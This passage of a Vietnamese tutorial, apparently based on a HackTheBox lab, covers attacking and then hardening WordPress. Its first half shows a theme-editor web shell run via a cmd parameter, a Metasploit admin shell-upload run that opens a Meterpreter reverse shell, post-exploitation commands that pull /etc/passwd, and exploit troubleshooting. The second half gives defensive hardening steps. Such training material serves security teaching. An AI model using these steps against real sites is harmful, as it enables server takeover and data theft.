Đoạn code trên cho phép chúng ta thực thi các lệnh thông qua tham số GET có tên là `cmd`. Trong ví dụ này, chúng ta đã chỉnh sửa mã nguồn của trang `404.php` và thêm một hàm mới có tên `system()`. Hàm này cho phép chúng ta thực thi trực tiếp các lệnh hệ điều hành (operating system commands) bằng cách gửi một GET request và thêm tham số `cmd` vào cuối URL sau dấu chấm hỏi `?` và chỉ định một lệnh hệ điều hành. 

URL đã được chỉnh sửa sẽ có dạng: `404.php?cmd=id`

**RCE Validation**

```bash
23senku@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"

uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
```

### Tấn Công WordPress với Metasploit Framework

#### Giới Thiệu về Khai Thác Tự Động

Metasploit Framework (MSF) là một công cụ mạnh mẽ cho phép chúng ta tự động hóa quá trình khai thác lỗ hổng và lấy reverse shell từ mục tiêu. Để sử dụng phương pháp này, chúng ta cần có:

- **Thông tin đăng nhập hợp lệ** (valid credentials) cho một tài khoản WordPress
- **Quyền đủ cao** để tạo và upload file lên webserver (thường là quyền Administrator hoặc Editor)

> **Reverse Shell là gì?** 
> Reverse shell là một kết nối từ máy mục tiêu (target) về máy tấn công (attacker), cho phép chúng ta kiểm soát máy mục tiêu từ xa. Khác với webshell cần truy cập qua browser, reverse shell cung cấp một terminal tương tác (interactive shell) trực tiếp.

#### Bước 1: Khởi Động Metasploit Framework

Để bắt đầu làm việc với Metasploit, sử dụng lệnh sau trong terminal:

**Starting Metasploit Framework**

```bash
23senku@htb[/htb]$ msfconsole
```

Lệnh này sẽ khởi động console của Metasploit. Quá trình khởi động có thể mất vài giây để load toàn bộ modules và databases.

#### Bước 2: Tìm Kiếm Module WordPress

Metasploit có sẵn một module chuyên dụng để khai thác WordPress thông qua việc upload shell. Chúng ta tìm kiếm module này bằng lệnh:

**MSF Search**

```bash
msf5 > search wp_admin

Matching Modules
================

#  Name                                       Disclosure Date  Rank       Check  Description
-  ----                                       ---------------  ----       -----  -----------
0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
```

**Giải thích kết quả:**
- **#0**: ID của module (số thứ tự để tham chiếu nhanh)
- **Name**: Tên đầy đủ của module
- **Rank: excellent**: Độ tin cậy cao, module hoạt động rất tốt
- **Check: Yes**: Module có khả năng kiểm tra xem target có dễ bị tổn thương hay không

#### Bước 3: Chọn Module

Sau khi tìm thấy module, chúng ta chọn nó để sử dụng. Có thể dùng ID hoặc tên đầy đủ:

**Module Selection**

```bash
msf5 > use 0
# hoặc: use exploit/unix/webapp/wp_admin_shell_upload

msf5 exploit(unix/webapp/wp_admin_shell_upload) >
```

Khi prompt chuyển sang `msf5 exploit(unix/webapp/wp_admin_shell_upload)`, có nghĩa là chúng ta đã chọn thành công module này.

#### Bước 4: Xem Các Tùy Chọn Module

Mỗi module cần các thông tin cấu hình khác nhau. Để xem danh sách các tùy chọn, sử dụng lệnh `options`:

**List Options**

```bash
msf5 exploit(unix/webapp/wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
PASSWORD                    yes       The WordPress password to authenticate with
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT      80               yes       The target port (TCP)
SSL        false            no        Negotiate SSL/TLS for outgoing connections
TARGETURI  /                yes       The base path to the wordpress application
USERNAME                    yes       The WordPress username to authenticate with
VHOST                       no        HTTP server virtual host


Exploit target:

Id  Name
--  ----
0   WordPress
```

**Giải thích các tùy chọn quan trọng:**

| Tùy chọn | Bắt buộc? | Ý nghĩa | Ví dụ |
|----------|-----------|---------|-------|
| **RHOSTS** | **Yes** | Địa chỉ IP hoặc domain của target | `blog.inlanefreight.com` hoặc `192.168.1.100` |
| **RPORT** | **Yes** | Port của web server (mặc định 80) | `80` (HTTP) hoặc `443` (HTTPS) |
| **USERNAME** | **Yes** | Tên đăng nhập WordPress | `admin` |
| **PASSWORD** | **Yes** | Mật khẩu WordPress | `Winter2020` |
| **LHOST** | **Yes** | IP của máy tấn công (để nhận reverse shell) | `10.10.16.8` |
| **LPORT** | No | Port để nhận reverse shell (mặc định 4444) | `4444` |
| **TARGETURI** | **Yes** | Đường dẫn đến WordPress (mặc định `/`) | `/` hoặc `/wordpress/` |
| **SSL** | No | Sử dụng HTTPS hay không | `true` hoặc `false` |

#### Bước 5: Cấu Hình Module

Sử dụng lệnh `set` để cấu hình các thông số cần thiết:

**Set Options**

```bash
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.com
rhosts => blog.inlanefreight.com

msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
username => admin

msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
password => Winter2020

msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
lhost => 10.10.16.8
```

> **Lưu ý**: 
> - `RHOSTS` là địa chỉ của **mục tiêu** (target)
> - `LHOST` là địa chỉ IP của **máy bạn** (attacker machine)
> - Để biết IP của máy bạn, chạy lệnh: `ifconfig` (Linux/Mac) hoặc `ipconfig` (Windows)

#### Bước 6: Thực Thi Exploit

Sau khi cấu hình đầy đủ, sử dụng lệnh `run` hoặc `exploit` để thực thi:

**Exploitation**

```bash
msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.10.16.8:4444
[*] Authenticating with WordPress using admin:Winter2020...
[+] Authenticated with WordPress
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/YtyZGFIhax/uTvAAKrAdp.php...
[*] Sending stage (38247 bytes) to blog.inlanefreight.com
[*] Meterpreter session 1 opened (10.10.16.8:4444 -> blog.inlanefreight.com:52392)
[+] Deleted uTvAAKrAdp.php

meterpreter >
```

#### Giải Thích Quá Trình Khai Thác

Hãy cùng phân tích từng bước mà Metasploit thực hiện:

1. **Started reverse TCP handler** 
   - Metasploit mở một "listener" (bộ lắng nghe) trên máy tấn công tại port 4444
   - Listener này đợi kết nối reverse shell từ target

2. **Authenticating with WordPress**
   - Module đăng nhập vào WordPress với credentials đã cung cấp
   - `[+]` có nghĩa là đăng nhập thành công

3. **Uploading payload**
   - Module tự động upload một file PHP chứa mã độc (payload)
   - File này được upload vào thư mục plugins với tên ngẫu nhiên (ví dụ: `YtyZGFIhax`)

4. **Executing the payload**
   - Module kích hoạt payload bằng cách truy cập URL của file PHP vừa upload
   - Payload tạo kết nối ngược về máy tấn công

5. **Sending stage**
   - Metasploit gửi "stage 2" của payload (Meterpreter) đến target
   - Meterpreter là một advanced payload cung cấp nhiều tính năng mạnh mẽ

6. **Meterpreter session opened**
   - Kết nối reverse shell được thiết lập thành công
   - Bạn có một session Meterpreter tương tác với target

7. **Deleted payload file**
   - Module tự động xóa file PHP đã upload để che dấu vết

#### Sử Dụng Meterpreter Shell

Sau khi có Meterpreter session, bạn có thể thực thi nhiều lệnh khác nhau:

**Các Lệnh Meterpreter Cơ Bản**

```bash
# Xem user hiện tại
meterpreter > getuid
Server username: www-data (33)

# Liệt kê thư mục hiện tại
meterpreter > ls

# Xem thông tin hệ thống
meterpreter > sysinfo

# Đọc file
meterpreter > cat /home/wp-user/flag.txt

# Download file từ target về máy tấn công
meterpreter > download /etc/passwd /tmp/passwd

# Upload file từ máy tấn công lên target
meterpreter > upload /tmp/exploit.sh /tmp/exploit.sh

# Mở shell Linux thông thường
meterpreter > shell

# Thoát khỏi Meterpreter (giữ session ở background)
meterpreter > background

# Thoát và đóng session
meterpreter > exit
```

#### So Sánh: Metasploit vs Manual Exploitation

| Tiêu chí | Manual (Theme Editor) | Metasploit |
|----------|----------------------|------------|
| **Tốc độ** | Chậm (nhiều bước thủ công) | Nhanh (tự động) |
| **Kỹ năng** | Dễ học, dễ hiểu | Cần hiểu về Metasploit |
| **Shell Type** | Web shell (qua browser) | Reverse shell (interactive) |
| **Stealth** | Dễ phát hiện (để lại file) | Tự động dọn dẹp |
| **Tính năng** | Giới hạn (chỉ thực thi lệnh) | Nhiều tính năng (Meterpreter) |
| **Khi nào dùng?** | Học tập, hiểu cơ chế | Thực chiến, pentest chuyên nghiệp |

#### Troubleshooting - Xử Lý Lỗi Thường Gặp

**Lỗi 1: Authentication Failed**
```
[-] Authenticating with WordPress using admin:Winter2020... Failed
```
**Giải pháp**: Kiểm tra lại username và password

**Lỗi 2: Connection Timeout**
```
[-] Exploit aborted due to failure: unreachable: Unable to connect to the target
```
**Giải pháp**: 
- Kiểm tra RHOSTS có đúng không
- Kiểm tra target có online không: `ping <target>`
- Kiểm tra firewall có chặn không

**Lỗi 3: No Session Created**
```
[*] Exploit completed, but no session was created.
```
**Giải pháp**:
- Kiểm tra LHOST có đúng IP của máy bạn không
- Kiểm tra firewall có chặn port 4444 không
- Thử đổi LPORT sang port khác: `set lport 8080`

## Gia Cố Bảo Mật WordPress (WordPress Hardening)

Sau khi tìm hiểu cách tấn công WordPress, điều cực kỳ quan trọng là phải biết cách **bảo vệ** WordPress khỏi các cuộc tấn công. Phần này sẽ hướng dẫn các Best Practices (Thực hành tốt nhất) để ngăn chặn các cuộc tấn công vào website WordPress.

> **Tại sao phải hardening?**
> Hardening (gia cố) là quá trình tăng cường bảo mật bằng cách giảm thiểu bề mặt tấn công (attack surface) và loại bỏ các điểm yếu. Một WordPress được hardening tốt sẽ khó bị xâm nhập hơn rất nhiều.

### 1. Thực Hiện Cập Nhật Thường Xuyên

**Cập nhật là nguyên tắc quan trọng nhất** trong bảo mật ứng dụng và hệ thống. Điều này có thể giảm đáng kể nguy cơ bị tấn công thành công.


#### Tại sao phải cập nhật?

Các nhà nghiên cứu bảo mật liên tục phát hiện lỗ hổng trong WordPress plugins của bên thứ ba. Khi phát hiện lỗ hổng, nhà phát triển sẽ phát hành bản vá (patch) trong phiên bản mới. Nếu không cập nhật, website của bạn sẽ vẫn có lỗ hổng đó.

#### Cách bật tự động cập nhật

Một số hosting provider thậm chí thực hiện cập nhật tự động liên tục cho WordPress core. Bảng điều khiển WordPress admin thường sẽ thông báo khi plugins, themes hoặc WordPress cần được cập nhật.

**Kích hoạt Auto-Update bằng wp-config.php:**

Thêm các dòng sau vào file `wp-config.php`:

```php
// Tự động cập nhật WordPress Core
define( 'WP_AUTO_UPDATE_CORE', true );
```

```php
// Tự động cập nhật tất cả Plugins
add_filter( 'auto_update_plugin', '__return_true' );
```

```php
// Tự động cập nhật tất cả Themes
add_filter( 'auto_update_theme', '__return_true' );
```

> **⚠️ Lưu ý**: Tự động cập nhật có thể gây xung đột hoặc làm hỏng website nếu plugin/theme không tương thích. Nên test trên môi trường staging trước khi áp dụng cho production.

### 2. Quản Lý Plugins và Themes

Plugins và themes là nguồn lỗ hổng phổ biến nhất trong WordPress. Quản lý chúng đúng cách là then chốt của bảo mật.

#### Nguyên tắc cài đặt Plugins/Themes

**Trước khi cài đặt, hãy kiểm tra:**

| Tiêu chí | Ý nghĩa | Dấu hiệu tốt |
|----------|---------|--------------|
| **Reviews** | Đánh giá từ người dùng | 4+ sao, nhiều reviews tích cực |
| **Popularity** | Mức độ phổ biến | Nhiều active installations |
| **Number of Installs** | Số lượt cài đặt | 10,000+ installs |
| **Last Update** | Lần cập nhật cuối | Trong vòng 6 tháng gần đây |
| **Compatibility** | Tương thích WP version | "Tested up to" phiên bản hiện tại |

**⚠️ Dấu hiệu nguy hiểm:**
- Plugin/Theme không được update trong nhiều năm → có thể bị bỏ rơi, chứa lỗ hổng chưa vá
- Ít reviews hoặc nhiều reviews tiêu cực
- Yêu cầu permissions không hợp lý

#### Audit định kỳ

**Thường xuyên kiểm tra WordPress site của bạn:**

```bash
# Liệt kê tất cả plugins (nếu có SSH access)
wp plugin list

# Liệt kê tất cả themes
wp theme list
```

**Hành động cần thực hiện:**
- 🗑️ **Xóa** (không chỉ deactivate) các plugins/themes không dùng
- 🔄 **Cập nhật** plugins/themes đã lỗi thời
- 📊 **Theo dõi** các thông báo bảo mật về plugins bạn đang dùng

> **Quan trọng**: Deactivating (vô hiệu hóa) plugin KHÔNG cải thiện bảo mật! Plugin vẫn có thể được truy cập trực tiếp qua URL. Phải **DELETE** (xóa) hoàn toàn.

### 3. Tăng Cường Bảo Mật với Security Plugins

WordPress có nhiều plugin bảo mật mạnh mẽ có thể đóng vai trò như:
- 🛡️ **WAF** (Web Application Firewall)
- 🔍 **Malware Scanner** (Quét mã độc)
- 📊 **Monitoring & Activity Auditing** (Giám sát hoạt động)
- 🔒 **Brute Force Prevention** (Ngăn chặn brute force)
- 🔑 **Strong Password Enforcement** (Bắt buộc mật khẩu mạnh)

#### Top 3 Security Plugins Phổ Biến

##### 1️⃣ Sucuri Security

**Tính năng chính:**

| Tính năng | Mô tả |
|-----------|-------|
| **Security Activity Auditing** | Ghi lại mọi hoạt động bảo mật trên site |
| **File Integrity Monitoring** | Giám sát file có bị chỉnh sửa bất thường không |
| **Remote Malware Scanning** | Quét malware từ xa (không tốn tài nguyên server) |
| **Blacklist Monitoring** | Kiểm tra xem site có bị Google/Norton blacklist không |

**Khi nào dùng**: Phù hợp cho website cần giám sát và phát hiện xâm nhập

##### 2️⃣ iThemes Security

**Tính năng nổi bật (30+ tính năng):**

- ✅ **Two-Factor Authentication (2FA)** - Xác thực 2 lớp
- ✅ **WordPress Salts & Security Keys** - Tự động làm mới security keys
- ✅ **Google reCAPTCHA** - Chặn bot tự động
- ✅ **User Action Logging** - Ghi log mọi hành động user

**Ưu điểm**: All-in-one solution, dễ cấu hình cho người mới

##### 3️⃣ Wordfence Security

**Tính năng mạnh mẽ:**

- 🔥 **Endpoint Firewall** - WAF chạy ngay trên WordPress
- 🔍 **Malware Scanner** - Quét toàn bộ file, themes, plugins
- ⚡ **Real-time Protection** (Premium) - Cập nhật firewall rules theo thời gian thực
- 🚫 **Real-time IP Blacklisting** (Premium) - Auto-block các IP độc hại đã biết

**So sánh Free vs Premium:**

| Tính năng | Free | Premium |
|-----------|------|---------|
| Firewall rules update | Chậm 30 ngày | Real-time |
| Malware signatures | Chậm 30 ngày | Real-time |
| IP blacklist | Chậm 30 ngày | Real-time |
| 2FA | ✅ | ✅ |
| Country blocking | ❌ | ✅ |

**Khi nào dùng**: Website quan trọng, cần bảo vệ real-time

### 4. Quản Lý Người Dùng (User Management)

Người dùng thường là **mắt xích yếu nhất** trong tổ chức. Áp dụng các best practices sau để cải thiện bảo mật:

#### 4.1. Quản Lý Tài Khoản

**🚫 Không dùng username "admin"**

```bash
# Tại sao nguy hiểm?
# - Attacker biết 50% thông tin đăng nhập (username = admin)
# - Chỉ cần brute force password

# Giải pháp:
# 1. Tạo user mới với username khó đoán (vd: j0hn_5m1th_2024)
# 2. Gán quyền Administrator
# 3. Xóa user "admin" cũ
```


#### 4.2. Chính Sách Mật Khẩu

**Bắt buộc mật khẩu mạnh:**

**Yêu cầu tối thiểu:**
- Ít nhất 12-16 ký tự
- Kết hợp chữ hoa, chữ thường, số, ký tự đặc biệt
- Không dùng từ điển hoặc thông tin cá nhân
- Thay đổi mật khẩu định kỳ (3-6 tháng)

**Plugins hỗ trợ:**
- Force Strong Passwords
- Password Policy Manager

#### 4.3. Xác Thực Hai Lớp (2FA)

**Bật 2FA cho TẤT CẢ người dùng** (đặc biệt Administrator)

**Cách hoạt động:**
1. Nhập username + password (Factor 1)
2. Nhập mã OTP từ app điện thoại (Factor 2)

**Plugins hỗ trợ 2FA:**
- Wordfence Login Security
- Google Authenticator
- Two Factor Authentication (miniOrange)

> **💡 Tip**: Ngay cả khi password bị lộ, attacker vẫn không thể đăng nhập nếu có 2FA

#### 4.4. Nguyên Tắc Least Privilege (Đặc quyền Tối thiểu)

**Chỉ cấp quyền CẦN THIẾT:**

| Role | Quyền hạn | Khi nào dùng |
|------|-----------|--------------|
| **Administrator** | Full control | Chỉ cho 1-2 người đáng tin cậy |
| **Editor** | Quản lý nội dung | Biên tập viên chính |
| **Author** | Viết và publish bài của mình | Tác giả content |
| **Contributor** | Viết nhưng không publish | Người viết bài trial |
| **Subscriber** | Chỉ đọc | Thành viên thông thường |

**❌ Sai lầm thường gặp:**
- Cấp quyền Admin cho mọi người
- Không thu hồi quyền khi nhân viên nghỉ việc

#### 4.5. Audit Người Dùng Định Kỳ

**Hàng tháng/quý, hãy:**

```bash
# Kiểm tra danh sách users
wp user list

# Xóa user không còn cần thiết
wp user delete <user_id>

# Thay đổi role của user
wp user set-role <user_id> <role>
```

**Checklist:**
- [ ] Có user nào không còn làm việc chưa xóa?
- [ ] Có user nào có quyền quá cao so với công việc?
- [ ] Có tài khoản test nào chưa xóa?
- [ ] Có user nào bị nghi ngờ bị compromise?

### 5. Quản Lý Cấu Hình (Configuration Management)

Một số thay đổi cấu hình có thể tăng đáng kể mức độ bảo mật của WordPress.

#### 5.1. Vô Hiệu Hóa User Enumeration

**Vấn đề:** 
Attacker có thể enumerate (liệt kê) danh sách username hợp lệ thông qua:
- URL: `/?author=1` → Redirect đến `/author/admin/` → Lộ username "admin"
- REST API: `/wp-json/wp/v2/users` → Trả về danh sách users
- XML-RPC với `wp.getUsersBlogs`

**Giải pháp:**

```php
// Thêm vào functions.php của theme
// Chặn author enumeration qua URL
if (!is_admin()) {
    if (preg_match('/author=([0-9]*)/i', $_SERVER['QUERY_STRING'])) {
        die('forbidden');
    }
    add_filter('redirect_canonical', 'disable_author_enumeration', 10, 2);
}
function disable_author_enumeration($redirect, $request) {
    if (preg_match('/\?author=([0-9]*)(\/*)/i', $request)) {
        return false;
    } else {
        return $redirect;
    }
}

// Ẩn users khỏi REST API
add_filter('rest_endpoints', function($endpoints) {
    if (isset($endpoints['/wp/v2/users'])) {
        unset($endpoints['/wp/v2/users']);
    }
    if (isset($endpoints['/wp/v2/users/(?P<id>[\d]+)'])) {
        unset($endpoints['/wp/v2/users/(?P<id>[\d]+)']);
    }
    return $endpoints;
});
```

**Hoặc dùng plugin:** Stop User Enumeration

#### 5.2. Giới Hạn Login Attempts

**Vấn đề:** Không có giới hạn → Attacker có thể brute force không giới hạn

**Giải pháp:** Giới hạn số lần đăng nhập thất bại

```
Ví dụ: 
- 3 lần thất bại → Chặn 15 phút
- 5 lần thất bại → Chặn 1 giờ
- 10 lần thất bại → Chặn 24 giờ
```

**Plugins:**
- Limit Login Attempts Reloaded
- WP Limit Login Attempts
- Wordfence (có tính năng này tích hợp)

**Cấu hình mẫu:**
- **Allowed retries**: 3 lần
- **Lockout duration**: 20 phút
- **Lockout increase**: x4 sau mỗi lần bị lock
- **Notify by email**: Gửi email khi có nhiều failed attempts

#### 5.3. Đổi URL Trang Đăng Nhập

**Vấn đề:** 
- Trang login mặc định: `/wp-login.php` hoặc `/wp-admin`
- Tất cả attacker đều biết URL này
- Dễ bị tấn công brute force tự động

**Giải pháp 1: Đổi tên trang login**

Sử dụng plugin **WPS Hide Login**:
- Đổi `/wp-login.php` → `/my-secret-login-page-2024`
- Cấu hình chỉ admin biết URL mới
- URL cũ sẽ trả về 404

**Giải pháp 2: Giới hạn IP truy cập**

```apache
# Thêm vào .htaccess
<Files wp-login.php>
    Order Deny,Allow
    Deny from all
    # Chỉ cho phép IP văn phòng
    Allow from 203.0.113.50
    Allow from 198.51.100.25
</Files>
```

**Giải pháp 3: Ẩn wp-admin khỏi Internet**

```nginx
# Nginx config
location ~ ^/wp-admin {
    allow 203.0.113.0/24;  # Cho phép subnet văn phòng
    deny all;
}
```

> **⚠️ Lưu ý**: Lưu URL login mới cẩn thận! Nếu quên, bạn sẽ không thể đăng nhập.

### 6. Các Biện Pháp Bảo Mật Khác

#### 6.1. Vô Hiệu Hóa XML-RPC

Nếu không cần XML-RPC, hãy tắt nó:

```php
// Thêm vào functions.php
add_filter('xmlrpc_enabled', '__return_false');
```

Hoặc chặn trong `.htaccess`:

```apache
<Files xmlrpc.php>
    Order Deny,Allow
    Deny from all
</Files>
```

#### 6.2. Thay Đổi Database Prefix

Thay vì dùng `wp_` mặc định, đổi thành prefix khác khó đoán:

```php
// wp-config.php
$table_prefix = 'x7k2_';  // Thay vì 'wp_'
```

#### 6.3. Vô Hiệu Hóa File Editing

Ngăn chỉnh sửa PHP files từ admin dashboard:

```php
// Thêm vào wp-config.php
define('DISALLOW_FILE_EDIT', true);
```

#### 6.4. Bảo Mật wp-config.php

```apache
# Chặn truy cập wp-config.php
<Files wp-config.php>
    Order Allow,Deny
    Deny from all
</Files>
```

### 7. Checklist Tổng Hợp Bảo Mật WordPress

**Cài đặt và Cập nhật:**
- [ ] Enable tự động cập nhật WordPress core
- [ ] Enable tự động cập nhật plugins
- [ ] Enable tự động cập nhật themes
- [ ] Kiểm tra và cập nhật thủ công hàng tuần

**Plugins và Themes:**
- [ ] Chỉ cài từ nguồn tin cậy (WordPress.org)
- [ ] Xóa tất cả plugins/themes không dùng
- [ ] Kiểm tra reviews và last update trước khi cài
- [ ] Audit plugins/themes định kỳ

**Security Plugins:**
- [ ] Cài đặt ít nhất 1 security plugin (Wordfence/Sucuri/iThemes)
- [ ] Cấu hình WAF
- [ ] Bật malware scanning
- [ ] Bật activity monitoring

**User Management:**
- [ ] Xóa user "admin" mặc định
- [ ] Tạo usernames khó đoán
- [ ] Bắt buộc mật khẩu mạnh (12+ ký tự)
- [ ] Enable 2FA cho tất cả users
- [ ] Áp dụng nguyên tắc least privilege
- [ ] Audit users hàng tháng

**Configuration:**
- [ ] Vô hiệu hóa user enumeration
- [ ] Giới hạn login attempts (3-5 lần)
- [ ] Đổi URL trang login hoặc giới hạn IP
- [ ] Vô hiệu hóa XML-RPC (nếu không dùng)
- [ ] Thay đổi database prefix
- [ ] Disable file editing từ dashboard
- [ ] Bảo vệ wp-config.php

**Backup và Monitoring:**
- [ ] Thiết lập backup tự động (daily/weekly)
- [ ] Test restore backup định kỳ
- [ ] Monitor logs cho hoạt động bất thường
- [ ] Thiết lập uptime monitoring
- [ ] Cấu hình email alerts cho security events

---

> **📌 Tóm tắt**: 
> Bảo mật WordPress không phải là việc một lần mà là một **quá trình liên tục**. Kết hợp nhiều lớp bảo vệ (defense in depth) sẽ tạo ra một hệ thống an toàn. Ngay cả khi một lớp bị xâm phạm, các lớp khác vẫn bảo vệ được website.

